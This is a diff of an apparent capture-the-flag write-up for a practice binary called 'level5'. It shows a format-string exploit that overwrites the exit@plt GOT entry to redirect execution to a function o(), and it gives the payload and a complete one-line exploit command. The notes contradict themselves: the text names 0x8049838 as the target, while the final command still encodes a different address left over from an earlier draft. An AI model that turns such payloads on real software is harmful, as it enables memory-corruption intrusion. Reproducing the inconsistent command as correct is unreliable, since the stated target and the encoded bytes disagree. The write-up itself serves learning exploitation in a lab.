@@ -92,24 +92,21 @@ Dump of assembler code for function exit@plt:
 End of assembler dump.
 ```
 
-looking in exit
+looking in exitwe see `0x8049838` where we can try to overwrite the address to point to `o()`
 
+payload:
 
-lookg at the 
-
+```sh
+0x080484a4
 %134513828%4\$n
 
-0x080484ff
-\xff\x84\x04\x08
-
 0x8049838
 \x38\x98\x04\x08
+```
 
-python -c "print '\xff\x84\x04\x08' + '%134513828x%4\$n'" | ./level5
+with this we replace the value of exit with `o()`
 
-
-0x8049838
-\x38\x98\x04\x08
-
-0x080484a4
+```sh
+cat <(python -c "print '\xff\x84\x04\x08' + '%134513828x%4\$n'") - | ./level5
+```
 
